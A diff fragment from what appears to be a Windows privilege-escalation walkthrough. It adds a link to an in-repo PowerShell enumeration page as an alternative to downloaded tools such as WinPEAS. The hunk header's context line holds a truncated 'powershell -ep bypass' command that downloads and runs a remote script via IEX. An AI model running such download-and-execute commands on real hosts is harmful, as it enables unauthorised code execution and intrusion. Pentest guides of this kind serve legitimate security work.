@@ -31,6 +31,8 @@ powershell -ep bypass -c "IEX(New-Object Net.WebClient).DownloadString('http://1
 
 See [Privilege Escalation Tools](Privilege-Escalation-Tools.md) for WinPEAS, PowerUp, SharpUp, Seatbelt, and Watson.
 
+For a **dependency-free, in-repo** alternative that needs no external download or dropped binary, use [PowerShell Privilege Escalation Enumeration](PowerShell-Privilege-Escalation-Enumeration.md) — it automates every check in Step 3's table.
+
 ## Step 2 — System & patch level
 
 ```cmd
